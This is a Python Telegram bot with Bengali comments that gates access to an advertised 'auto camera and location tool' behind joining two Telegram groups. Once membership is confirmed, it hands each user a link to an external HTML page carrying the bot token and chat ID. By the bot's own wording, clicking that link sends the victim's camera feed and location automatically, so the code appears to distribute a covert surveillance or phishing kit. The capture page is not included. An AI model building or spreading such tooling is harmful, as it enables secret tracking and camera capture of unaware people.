import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ========== কনফিগারেশন ==========
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")  # Render এ Environment Variable বসাবেন
GROUP_1_ID = int(os.getenv("GROUP_1_ID", -1003885529323))   # ঋণাত্মক সংখ্যা
GROUP_2_ID = int(os.getenv("GROUP_2_ID", -1003867100912))
LINK_URL = os.getenv("LINK_URL", "https://your-link.com/index.html")  # আপনার HTML পেজের লিংক

GROUP_1_INVITE = "https://t.me/+NJ4VnzY1mp45YzY1"   # আপনার গ্রুপের ইনভাইট লিংক
GROUP_2_INVITE = "https://t.me/oxifgaradarkmind"

# ওয়েবহুক সেটআপের জন্য PORT (Render এ 10000 বা 8443 দরকার)
PORT = int(os.environ.get('PORT', 8443))

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("✅ গ্রুপ ১ জয়েন করুন", url=GROUP_1_INVITE)],
        [InlineKeyboardButton("✅ গ্রুপ ২ জয়েন করুন", url=GROUP_2_INVITE)],
        [InlineKeyboardButton("🔍 জয়েন হয়েছে কিনা চেক করুন", callback_data="check")]
    ]
    await update.message.reply_text(
        "🚀 **অটো ক্যামেরা ও লোকেশন টুল পেতে দুইটি গ্রুপে জয়েন করুন**\n\nজয়েন করে নিচের বাটনে ক্লিক করুন।",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member1 = await context.bot.get_chat_member(GROUP_1_ID, user_id)
        member2 = await context.bot.get_chat_member(GROUP_2_ID, user_id)
    except Exception as e:
        await query.edit_message_text("❌ বটকে গ্রুপে অ্যাডমিন বানান অথবা Chat ID সঠিক নয়।")
        return
    
    ok1 = member1.status in ["member", "administrator", "creator"]
    ok2 = member2.status in ["member", "administrator", "creator"]
    
    if ok1 and ok2:
        await query.edit_message_text(
            f"✅ আপনি দুই গ্রুপেই জয়েন করেছেন!\n\n🎯 আপনার টুলের লিংক:\n`{LINK_URL}?bot={BOT_TOKEN}&chat={query.from_user.id}`\n\nলিংকে ক্লিক করলেই ক্যামেরা ও লোকেশন অটো পাঠাবে।\n\n⚠️ শুধুমাত্র আপনার জন্য এই লিংক।",
            parse_mode="Markdown"
        )
    else:
        missing = []
        if not ok1: missing.append("গ্রুপ ১")
        if not ok2: missing.append("গ্রুপ ২")
        await query.edit_message_text(
            f"❌ আপনি এখনো জয়েন করেননি: {', '.join(missing)}\n\nউপরের বাটনে ক্লিক করে জয়েন করুন।",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔁 পুনরায় চেক করুন", callback_data="check")]])
        )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(check_callback, pattern="check"))
    
    # ওয়েবহুক চালু করবে (Render-এ স্বয়ংক্রিয়)
    app.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        webhook_url=f"https://আপনারঅ্যাপনেম.onrender.com/{BOT_TOKEN}"   # Render URL বসান
    )
    # যদি লোকাল টেস্ট করতে চান, তাহলে ওয়েবহুক বাদ দিয়ে app.run_polling() ব্যবহার করবেন।

if __name__ == "__main__":
    main()
